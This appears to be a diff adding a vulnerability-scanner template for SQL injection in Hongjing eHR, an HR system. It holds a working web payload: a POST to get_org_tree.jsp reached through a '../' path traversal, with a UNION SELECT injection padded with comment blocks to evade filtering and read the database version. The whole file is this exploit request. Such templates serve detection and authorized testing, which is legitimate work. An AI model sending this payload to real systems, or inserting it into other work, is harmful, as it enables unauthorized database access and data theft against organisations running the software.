@@ -1,0 +1,18 @@
+id:
+info:
+  name: 宏景eHR 多处 SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /templates/attestation/../../hire/zp_options/get_org_tree.jsp
+  data: |
+    params=1%3c1/***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***/union/***//***/select/***//***/1,2,@@version,4--+
+response1:
+  headers:
+  body: SQL
+  code:
+requests2:
+response2:
